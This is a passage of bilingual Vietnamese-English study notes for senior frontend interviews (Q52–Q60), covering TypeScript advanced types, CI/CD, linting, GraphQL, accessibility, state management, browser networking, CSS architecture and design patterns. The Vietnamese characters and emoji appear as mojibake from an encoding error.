## 53. üî∑ Q52: TypeScript Advanced Patterns - Generics, Utility Types, Advanced Patterns  

**P1: T√™n c√¢u h·ªèi:** üî∑ Q52: TypeScript Advanced Patterns - Generics, Utility Types, Advanced Patterns  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"TypeScript advanced = Generics, Utility Types, Mapped Types, Conditional Types, Type Guards.**

**üîß Core Advanced Concepts:**

1. **Generics**:
   - **Purpose**: Type-safe reusable functions/components.
   - **Constraints**: `<T extends Type>` ‚Üí limit T to specific types.
   ```ts
   function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
     return obj[key]; // Ch√∫ gi·∫£i: Type-safe property access
   }
   const user = { name: 'Alice', age: 30 };
   getProperty(user, 'name'); // Ch√∫ gi·∫£i: Type: string
   ```

2. **Utility Types** (Built-in):
   - **`Partial<T>`**: T·∫•t c·∫£ properties optional.
   - **`Required<T>`**: T·∫•t c·∫£ properties required.
   - **`Pick<T, K>`**: L·∫•y subset properties.
   - **`Omit<T, K>`**: Lo·∫°i b·ªè properties.
   - **`Record<K, V>`**: Object v·ªõi keys K, values V.
   - **`Readonly<T>`**: Immutable properties.
   ```ts
   type User = { id: number; name: string; email: string };
   type PartialUser = Partial<User>; // Ch√∫ gi·∫£i: All optional
   type UserName = Pick<User, 'id' | 'name'>; // Ch√∫ gi·∫£i: Only id, name
   type NoEmail = Omit<User, 'email'>; // Ch√∫ gi·∫£i: Exclude email
   ```

3. **Mapped Types**:
   - Transform existing types.
   ```ts
   type Readonly<T> = { readonly [K in keyof T]: T[K] };
   type Optional<T> = { [K in keyof T]?: T[K] };
   ```

4. **Conditional Types**:
   - `T extends U ? X : Y` ‚Üí type-level if-else.
   ```ts
   type IsString<T> = T extends string ? true : false;
   type A = IsString<string>; // Ch√∫ gi·∫£i: true
   type B = IsString<number>; // Ch√∫ gi·∫£i: false
   ```

5. **Template Literal Types** (TS 4.1+):
   - String manipulation at type level.
   ```ts
   type EventName<T extends string> = `on${Capitalize<T>}`;
   type ClickEvent = EventName<'click'>; // Ch√∫ gi·∫£i: "onClick"
   ```

6. **Type Guards**:
   - Runtime type checking ‚Üí narrow types.
   ```ts
   function isString(value: unknown): value is string {
     return typeof value === 'string';
   }
   if (isString(value)) {
     value.toUpperCase(); // Ch√∫ gi·∫£i: TS knows value is string
   }
   ```

7. **Discriminated Unions**:
   - Type-safe state machines.
   ```ts
   type State = 
     | { status: 'loading' }
     | { status: 'success'; data: string }
     | { status: 'error'; error: Error };
   
   function handle(state: State) {
     switch (state.status) {
       case 'loading': return 'Loading...';
       case 'success': return state.data; // Ch√∫ gi·∫£i: TS knows data exists
       case 'error': return state.error.message;
     }
   }
   ```

**üéØ Real-World Use Cases:**

1. **API Response Typing**:
   ```ts
   type ApiResponse<T> = 
     | { success: true; data: T }
     | { success: false; error: string };
   
   async function fetchUser(): Promise<ApiResponse<User>> {
 // Ch√∫ gi·∫£i: ...
   }
   ```

2. **Form State**:
   ```ts
   type FormState<T> = {
     values: T;
     errors: Partial<Record<keyof T, string>>;
     touched: Partial<Record<keyof T, boolean>>;
   };
   ```

3. **Branded Types** (Nominal Typing):
   - Prevent mixing similar types.
   ```ts
   type UserId = string & { __brand: 'UserId' };
   type ProductId = string & { __brand: 'ProductId' };
   
   function getUser(id: UserId) { /*...*/ }
   const userId = '123' as UserId;
   getUser(userId); // Ch√∫ gi·∫£i: OK
 // Ch√∫ gi·∫£i: getUser('456'); // Error: string not assignable to UserId
   ```

**‚ö†Ô∏è Common Mistakes:**
- **any overuse**: Defeat purpose of TypeScript ‚Üí d√πng `unknown` + type guards.
- **Type assertions abuse**: `as` bypass type checking ‚Üí d√πng type guards instead.
- **Missing generic constraints**: `<T>` too broad ‚Üí d√πng `<T extends Type>`.

**üí° Senior Insights:**
- **infer keyword**: Extract types from other types.
  ```ts
  type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
  ```
- **Const assertions**: `as const` ‚Üí literal types instead of widening.
  ```ts
  const colors = ['red', 'blue'] as const; // Ch√∫ gi·∫£i: Type: readonly ["red", "blue"]
  ```
- **tsconfig strict mode**: Enable all strict checks (`strict: true`) ‚Üí catch bugs early.
- **Declaration files**: `.d.ts` for third-party libraries kh√¥ng c√≥ types.

---

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Expert Level)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 15-20 ph√∫t

---
---
## 54. üöÄ Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation  

**P1: T√™n c√¢u h·ªèi:** üöÄ Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"CI/CD pipeline t·ª± ƒë·ªông h√≥a: Code quality (lint, test) ‚Üí Build ‚Üí Deploy. GitHub Actions: workflows YAML, matrix builds, caching. Deploy strategies: Blue-Green, Canary, Rolling. Secrets: GitHub Secrets + env variables."**

**üîë CI/CD Stages:**

**1. Code Quality (on PR):**
- ESLint + Prettier check (formatting)
- TypeScript type check
- Unit tests (Jest/Vitest)
- Integration tests (React Testing Library)
- Bundle size check (fail if > budget)

**2. Build (on merge):**
- Install dependencies (npm ci v·ªõi cache)
- Build production bundle (`npm run build`)
- Generate source maps
- Upload artifacts (S3, CDN)

**3. Deploy:**
- **Staging**: Auto-deploy on develop branch
- **Production**: Auto-deploy on main (or manual approval)
- Deployment strategies: Blue-Green, Canary, Rolling
- Health checks + smoke tests

**4. Post-Deploy:**
- Lighthouse CI (performance check)
- Sentry release tracking
- Slack/Discord notifications
- Rollback on failure

**üîë GitHub Actions Best Practices:**

- **Matrix builds**: Test nhi·ªÅu Node versions (18, 20, 22)
- **Caching**: `actions/cache` cho node_modules - save 2-5 phiM√∫t
- **Secrets**: `${{ secrets.API_KEY }}` - kh√¥ng hardcode
- **Conditional runs**: `if: github.event_name == 'push'`
- **Reusable workflows**: Share common workflows

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Kh√¥ng cache dependencies ‚Üí m·ªói build install l·∫°i (ch·∫≠m)
- Hardcode secrets trong code ‚Üí security risk
- Deploy th·∫≥ng production ‚Üí kh√¥ng rollback, d√πng Blue-Green
- Kh√¥ng test staging ‚Üí bugs in production

**üí° Ki·∫øn Th·ª©c Senior:**
- **Docker multi-stage builds**: Build image nh·ªè (Alpine base, remove dev deps)
- **Vercel/Netlify**: Zero-config CI/CD (auto-detect framework)
- **Deployment slots** (Azure): Test production environment tr∆∞·ªõc swap
- **Feature flags**: Deploy code OFF, b·∫≠t d·∫ßn (LaunchDarkly)

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Expert Level)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 15-20 ph√∫t

---
---
## 55. üìè Q54: Code Quality & Standards - ESLint, Prettier, Code Review  

**P1: T√™n c√¢u h·ªèi:** üìè Q54: Code Quality & Standards - ESLint, Prettier, Code Review  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Code quality tools: ESLint (bugs + patterns), Prettier (formatting), Husky (pre-commit hooks), Commitlint (conventional commits). Code review: Small PRs, clear descriptions, constructive feedback, automated checks."**

**üîë Tooling Stack:**

**1. ESLint - Linting:**
- **Find bugs**: unused vars, missing deps, type errors
- **Enforce patterns**: no-console, prefer-const, React hooks rules
- **Plugins**: @typescript-eslint, eslint-plugin-react, jsx-a11y
- **Config**: Extend airbnb/standard, customize rules

**2. Prettier - Formatting:**
- **Auto-format**: spacing, quotes, semicolons, line breaks
- **Config**: `.prettierrc` - printWidth, singleQuote, trailingComma
- **Integration**: ESLint plugin (eslint-plugin-prettier)
- **IDE**: Format on save (VSCode, WebStorm)

**3. Husky - Git Hooks:**
- **Pre-commit**: Run lint + format tr∆∞·ªõc commit
- **Pre-push**: Run tests tr∆∞·ªõc push
- **Commit-msg**: Validate commit message format
- **Setup**: `npx husky-init && npm install`

**4. Commitlint - Conventional Commits:**
- **Format**: `type(scope): subject` - `feat(auth): add login`
- **Types**: feat, fix, docs, style, refactor, test, chore
- **Benefits**: Auto-generate changelogs, semantic versioning

**üîë Code Review Best Practices:**

- **Small PRs**: < 400 lines - d·ªÖ review, √≠t bugs
- **Clear descriptions**: What/Why/How, screenshots, testing steps
- **Automated checks**: Lint, tests, bundle size pass tr∆∞·ªõc review
- **Constructive feedback**: Suggest alternatives, explain WHY
- **Timely reviews**: < 24 hours response time

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- ESLint warnings ignored ‚Üí accumulate technical debt
- Kh√¥ng Prettier ‚Üí inconsistent formatting, merge conflicts
- Large PRs (>1000 lines) ‚Üí rubber-stamp reviews
- Blame culture in reviews ‚Üí team morale gi·∫£m

**üí° Ki·∫øn Th·ª©c Senior:**
- **SonarQube**: Code quality metrics (bugs, vulnerabilities, code smells)
- **Bundle analysis**: webpack-bundle-analyzer - visualize bundle size
- **Lighthouse CI**: Performance budgets trong CI/CD
- **Danger.js**: Automate code review comments (big PRs warning, missing tests)

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê (Advanced)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 12-15 ph√∫t

---
---
## 56. üîÑ Q55: GraphQL vs REST - API Design, Apollo Client  

**P1: T√™n c√¢u h·ªèi:** üîÑ Q55: GraphQL vs REST - API Design, Apollo Client  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"GraphQL = single endpoint, client-driven queries, exact data (no over/under-fetching). REST = multiple endpoints, server-driven. Apollo Client: caching, optimistic updates, subscriptions. GraphQL t·ªët cho complex data, REST t·ªët cho simple CRUD."**

**üîë GraphQL vs REST:**

| **Aspect** | **REST** | **GraphQL** |
|-----------|---------|------------|
| **Endpoints** | Multiple (`/users`, `/posts`) | Single (`/graphql`) |
| **Data fetching** | Server decides | **Client decides** |
| **Over-fetching** | ‚úÖ Common | ‚ùå Exact fields |
| **Under-fetching** | ‚úÖ Multiple requests | ‚ùå Single request |
| **Versioning** | `/v1`, `/v2` | **No versions** (deprecate fields) |
| **Caching** | HTTP cache (simple) | Custom (Apollo cache) |

**üîë Apollo Client Features:**

**1. Caching:**
- **Normalized cache**: Store objects by ID, auto-dedupe
- **Cache policies**: cache-first, network-only, cache-and-network
- **Auto-update**: Mutations auto-update affected queries

**2. Queries & Mutations:**
- **useQuery**: Fetch data + loading/error states
- **useMutation**: Modify data + optimistic updates
- **Fragments**: Reusable field selections

**3. Subscriptions (Real-time):**
- WebSocket connection cho real-time updates
- Use case: Chat, notifications, live data

**4. Optimistic Updates:**
- Update UI immediately (assume success)
- Rollback if mutation fails

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- N+1 queries ‚Üí backend performance issue (d√πng DataLoader)
- Kh√¥ng hi·ªÉu cache ‚Üí redundant network requests
- Over-complicated queries ‚Üí ch·∫≠m backend, split queries
- Public GraphQL endpoint kh√¥ng rate limit ‚Üí DoS risk

**üí° Ki·∫øn Th·ª©c Senior:**
- **Persisted queries**: Pre-register queries (security + performance)
- **Automatic Persisted Queries** (APQ): Hash queries ‚Üí reduce bandwidth
- **Federation**: Microservices architecture cho GraphQL
- **Batching**: Combine multiple queries in 1 HTTP request

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê (Advanced)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 12-15 ph√∫t

---
---
## 57. ‚ôø Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers  

**P1: T√™n c√¢u h·ªèi:** ‚ôø Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"A11y ƒë·∫£m b·∫£o m·ªçi ng∆∞·ªùi d√πng ƒë∆∞·ª£c web. WCAG 2.1 levels: A (minimum), AA (legal requirement), AAA (ideal). ARIA: roles, states, properties. Keyboard nav, color contrast, screen reader support. Tools: axe, Lighthouse."**

**üîë WCAG 2.1 Compliance:**

**Level AA (Recommended - legal trong nhi·ªÅu n∆∞·ªõc):**
- **Color contrast**: ‚â• 4.5:1 (text), ‚â• 3:1 (large text 18pt+)
- **Keyboard accessible**: All functionality v·ªõi keyboard (no mouse-only)
- **Alt text**: T·∫•t c·∫£ images c√≥ alt (decorative = alt="")
- **Form labels**: `<label>` cho m·ªçi `<input>`
- **Touch targets**: ‚â• 44√ó44px (mobile)
- **Focus indicators**: R√µ r√†ng khi tab (kh√¥ng `outline: none`)

**üîë ARIA Attributes:**

**1. Roles:**
- `role="button"` - custom button (div click ‚Üí button semantics)
- `role="navigation"`, `role="main"`, `role="complementary"`
- **Rule**: D√πng semantic HTML tr∆∞·ªõc (`<button>` > `<div role="button">`)

**2. States:**
- `aria-expanded="true/false"` - dropdown, accordion
- `aria-checked="true/false"` - custom checkbox
- `aria-disabled="true"` - disabled state

**3. Properties:**
- `aria-label="Close"` - label cho icon buttons
- `aria-describedby="help-text"` - li√™n k·∫øt help text
- `aria-live="polite"` - announce dynamic content (alerts)

**üîë Best Practices:**

- **Semantic HTML**: `<button>`, `<nav>`, `<main>` thay v√¨ divs
- **Keyboard nav**: Tab order logic, Enter/Space activate, Esc close
- **Screen reader testing**: NVDA (Windows), VoiceOver (Mac/iOS), TalkBack (Android)
- **Skip links**: "Skip to main content" cho skip navigation

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- `outline: none` kh√¥ng custom focus indicator ‚Üí keyboard users lost
- Images kh√¥ng alt ‚Üí screen readers "image"
- Color-only info (red = error) ‚Üí colorblind users miss
- Auto-playing videos/carousels ‚Üí disorienting

**üí° Ki·∫øn Th·ª©c Senior:**
- **Focus management**: Trap focus trong modals, restore sau close
- **Live regions**: `aria-live="polite"` (wait), `"assertive"` (interrupt)
- **Automated testing**: axe-core, jest-axe, Lighthouse CI
- **Manual testing**: Tab navigation, zoom 200%, screen reader walkthrough

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê (Advanced)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 12-15 ph√∫t

---
---
## 58. üóÇÔ∏è Q57: State Management Comparison - Redux vs Zustand vs Jotai  

**P1: T√™n c√¢u h·ªèi:** üóÇÔ∏è Q57: State Management Comparison - Redux vs Zustand vs Jotai  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"State management: Server state (React Query/SWR), Global state (Redux/Zustand/Jotai), Local state (useState). Redux = mature, boilerplate, DevTools. Zustand = simple, hooks-based. Jotai = atomic, granular. Ch·ªçn based on complexity."**

**üîë So S√°nh 3 Libraries:**

| **Aspect** | **Redux Toolkit** | **Zustand** | **Jotai** |
|-----------|------------------|------------|----------|
| **Philosophy** | Centralized store | Simple hooks | Atomic state |
| **Boilerplate** | Medium (RTK gi·∫£m) | Low | Very low |
| **Bundle size** | ~20KB | **~1KB** | **~3KB** |
| **Learning curve** | High | Low | Medium |
| **DevTools** | ‚úÖ Best | ‚úÖ Basic | ‚úÖ Basic |
| **Async** | createAsyncThunk | Manual | Async atoms |
| **Use case** | Large apps, complex | Simple global state | Granular, React Suspense |

**üîë Khi n√†o d√πng c√°i g√¨:**

**1. Redux Toolkit:**
- **Large apps** v·ªõi complex state logic
- C·∫ßn **time-travel debugging**, state persistence
- Team quen Redux patterns
- Middleware (logging, analytics)

**2. Zustand:**
- **Simple global state** (theme, auth status)
- Mu·ªën **minimal boilerplate** + hooks-based
- Small-medium apps
- D·ªÖ migrate t·ª´ Context API

**3. Jotai:**
- **Atomic/granular updates** - ch·ªâ re-render affected components
- **React Suspense** integration
- Derived state (computed values)
- Bottom-up approach (atoms compose)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng Redux cho server state ‚Üí d√πng React Query/SWR (cache, refetch, optimistic)
- M·ªçi state v√†o global store ‚Üí unnecessary, d√πng local state cho forms/UI
- Kh√¥ng normalize Redux state ‚Üí nested updates ph·ª©c t·∫°p
- Zustand kh√¥ng immer ‚Üí mutate state tr·ª±c ti·∫øp, d√πng `immer` middleware

**üí° Ki·∫øn Th·ª©c Senior:**
- **State categories**: Server (React Query) | Global (Zustand) | Local (useState) | URL (React Router)
- **Redux Toolkit Query**: Built-in data fetching (alternative to React Query)
- **Jotai atoms**: L√†m vi·ªác v·ªõi React.lazy, Suspense boundaries
- **Zustand middleware**: persist (localStorage), immer (immutable updates), devtools

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**  
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê (Advanced)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 12-15 ph√∫t

---
---
## 59. üåê Q58: Networking & Browser Internals - M·∫°ng & N·ªôi T·∫ø Tr√¨nh Duy·ªát  

**P1: T√™n c√¢u h·ªèi:** üåê Q58: Networking & Browser Internals - M·∫°ng & N·ªôi T·∫ø Tr√¨nh Duy·ªát  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"HTTP/2 = multiplexing (1 TCP), HTTP/3 = QUIC (UDP, no TCP HoL). CORS = cross-origin security (preflight OPTIONS). CSP = prevent XSS. Cache: immutable, stale-while-revalidate. CDN = edge caching, bƒÉng th√¥ng, latency."**

**üîë Network Fundamentals:**

**1. HTTP Versions:**
- **HTTP/1.1**: 1 request/connection, head-of-line blocking
- **HTTP/2**: Multiplexing (many requests/1 TCP), header compression (HPACK), server push
- **HTTP/3**: QUIC (UDP), faster handshake (0-RTT), no TCP HoL blocking
- **Impact**: HTTP/2/3 = fewer requests overhead, kh√¥ng c·∫ßn concat files

**2. CORS (Cross-Origin Resource Sharing):**
- **Same-origin policy**: Browser block cross-origin requests
- **Simple requests**: GET/POST ‚Üí check `Access-Control-Allow-Origin`
- **Preflight**: OPTIONS request tr∆∞·ªõc PUT/DELETE/custom headers
- **Credentials**: `credentials: 'include'` + `Access-Control-Allow-Credentials: true`

**3. CSP (Content Security Policy):**
- **Prevent XSS**: Whitelist script sources
- Header: `Content-Security-Policy: script-src 'self' cdn.example.com`
- **Nonce**: `<script nonce="random123">` - random per request
- **Report-only mode**: Test CSP without blocking

**4. Browser Cache:**
- **`Cache-Control: immutable`**: File kh√¥ng bao gi·ªù thay ƒë·ªïi (hashed filenames)
- **`stale-while-revalidate`**: Serve stale, fetch fresh background
- **`max-age=3600`**: Cache 1 gi·ªù
- **ETag**: Validate cached file (304 Not Modified)

**5. CDN (Content Delivery Network):**
- **Edge caching**: Assets g·∫ßn user (lower latency)
- **Bandwidth**: Offload origin server
- **Security**: DDoS protection, WAF

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- CORS errors ‚Üí check server headers, proxy trong dev
- Kh√¥ng cache static assets ‚Üí waste bandwidth
- CSP too strict ‚Üí break inline scripts, d√πng nonces
- HTTP/1.1 concat files ‚Üí kh√¥ng c·∫ßn v·ªõi HTTP/2

**üí° Ki·∫øn Th·ª©c Senior:**
- **DNS prefetch**: `<link rel="dns-prefetch" href=" // Ch√∫ gi·∫£i: cdn.example.com">`
- **Preconnect**: Early TCP+TLS handshake
- **Brotli compression**: Better than gzip (~20% smaller)
- **Service Workers**: Network proxy, offline caching, cache strategies

> **C√¢u h·ªèi ph·ªèng v·∫•n Senior Frontend Developer**
> **ƒê·ªô kh√≥:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (Advanced)  
> **Th·ªùi gian tr·∫£ l·ªùi:** 15-25 ph√∫t---
---
## 60. üé® Q59: CSS Architecture & Modern Styling Approaches  

**P1: T√™n c√¢u h·ªèi:** üé® Q59: CSS Architecture & Modern Styling Approaches  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"CSS approaches: BEM (naming convention), CSS Modules (scoped), CSS-in-JS (dynamic, colocated), Tailwind (utility-first). Ch·ªçn based on: team size, dynamic needs, performance priority. Critical CSS = above-fold styles inline."**

**üîë 4 Modern Approaches:**

**1. BEM (Block Element Modifier):**
- **Naming**: `.block__element--modifier`
- ∆Øu: Clear, kh√¥ng conflicts, team-friendly
- Nh∆∞·ª£c: Verbose (d√†i), manually maintain
- Use case: Large teams, design systems

**2. CSS Modules:**
- **Scoped**: `import styles from './Button.module.css'`
- ∆Øu: Auto-scoped, no naming conflicts, works with existing CSS
- Nh∆∞·ª£c: Kh√¥ng dynamic (can't change based on props easily)
- Use case: Component libraries, gradual migration

**3. CSS-in-JS (Styled Components, Emotion):**
- **Syntax**: `const Button = styled.button\`color: ${props => props.color}\``
- ∆Øu: **Dynamic**, colocated, scoped, TypeScript support
- Nh∆∞·ª£c: Runtime overhead (~10-20ms), bundle size
- Use case: Highly dynamic UIs, design tokens

**4. Tailwind CSS:**
- **Utility-first**: `className="bg-blue-500 hover:bg-blue-700 px-4 py-2"`
- ∆Øu: **Fast development**, small final bundle (PurgeCSS), consistent design
- Nh∆∞·ª£c: HTML "bloat", learning curve (utility names)
- Use case: Rapid prototyping, startups, landing pages

**üîë Critical CSS:**

- **Inline above-fold CSS** trong `<head>` ƒë·ªÉ render nhanh
- Defer non-critical CSS (`<link rel="preload" as="style">`)
- Tools: Critters (Next.js), Critical (npm package)
- **FCP improvement**: ~30-50% faster First Contentful Paint

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- CSS-in-JS trong SSR kh√¥ng extract styles ‚Üí FOUC (Flash of Unstyled Content)
- Tailwind kh√¥ng purge ‚Üí 300KB+ CSS bundle
- BEM kh√¥ng consistent naming ‚Üí m·∫•t ∆∞u ƒëi·ªÉm
- Global CSS specificity wars ‚Üí `!important` hell

**üí° Ki·∫øn Th·ª©c Senior:**
- **Zero-runtime CSS-in-JS**: Linaria, Vanilla Extract - extract CSS build time
- **Atomic CSS**: Tailwind, StyleX (Meta) - share utility classes
- **Design tokens**: CSS variables cho themes, d√πng v·ªõi Tailwind/CSS-in-JS
- **Container queries**: Style based on parent size (kh√¥ng ph·∫£i viewport)

**‚ùì C√¢u H·ªèi:**

So s√°nh c√°c ph∆∞∆°ng ph√°p styling hi·ªán ƒë·∫°i: CSS-in-JS (Styled Components, Emotion), Tailwind CSS, CSS Modules, BEM methodology. Khi n√†o n√™n d√πng approach n√†o? Critical CSS l√† g√¨?

---
---
## 61. üèóÔ∏è Q60: JavaScript Design Patterns for Frontend Development  

**P1: T√™n c√¢u h·ªèi:** üèóÔ∏è Q60: JavaScript Design Patterns for Frontend Development  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Design patterns: Singleton (1 instance), Observer (subscribe changes), Factory (create objects), Module (encapsulation), Pub/Sub (event-driven), Dependency Injection (loose coupling). Modern: Hooks patterns, Compound Components."**

**üîë 6 Essential Patterns:**

**1. Singleton - Single Instance:**
- **Use case**: Database connection, config object, logger
- **JS**: Module exports object (auto-singleton), class v·ªõi static instance
- **Caution**: Hard to test (global state), avoid unless necessary

**2. Observer - Subscribe to Changes:**
- **Use case**: Event listeners, state management, reactive programming
- **Pattern**: Subject maintains observers list, notify on change
- **Modern**: RxJS Observables, MobX, Vue reactivity

**3. Pub/Sub (Publish-Subscribe):**
- **Kh√°c Observer**: Decoupled (event bus gi·ªØa publisher/subscriber)
- **Use case**: Cross-component communication, analytics events
- **Implementation**: EventEmitter, window.postMessage, Redux

**4. Factory - Object Creation:**
- **Use case**: Create objects without specifying exact class
- **Example**: `React.createElement()`, component factories
- **Benefits**: Flexibility, hide complexity

**5. Module Pattern - Encapsulation:**
- **ES6 Modules**: `export/import` - native encapsulation
- **IIFE**: `(function(){ ... })()` - private scope (legacy)
- **Use case**: Libraries, utilities, prevent global pollution

**6. Dependency Injection:**
- **Pattern**: Pass dependencies (kh√¥ng hard-code)
- **Use case**: Testing (mock dependencies), loose coupling
- **React**: Props, Context API, custom hooks

**üîë Modern React Patterns:**

- **Compound Components**: `<Select>` + `<Option>` share state
- **Render Props**: `<DataProvider render={data => ...} />`
- **Higher-Order Components** (HOC): `withAuth(Component)`
- **Custom Hooks**: `useAuth()`, `useFetch()` - reusable logic

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Over-engineering: D√πng patterns kh√¥ng c·∫ßn thi·∫øt ‚Üí complexity
- Singleton abuse ‚Üí global state, hard test
- Observer memory leaks ‚Üí forget unsubscribe
- Pub/Sub kh√¥ng type-safe ‚Üí d√πng TypeScript event types

**üí° Ki·∫øn Th·ª©c Senior:**
- **Strategy Pattern**: Interchangeable algorithms (sort strategies, payment methods)
- **Command Pattern**: Undo/redo functionality (Redux actions)
- **Proxy Pattern**: ES6 Proxy cho reactivity (Vue 3, MobX)
- **Facade Pattern**: Simplify complex APIs (Axios wraps fetch, jQuery wraps DOM)

**‚ùì C√¢u H·ªèi:**

Gi·∫£i th√≠ch c√°c Design Patterns ph·ªï bi·∫øn trong JavaScript/TypeScript frontend: Singleton, Observer, Factory, Module, Pub/Sub, Prototype, Dependency Injection. Khi n√†o n√™n d√πng pattern n√†o?

---

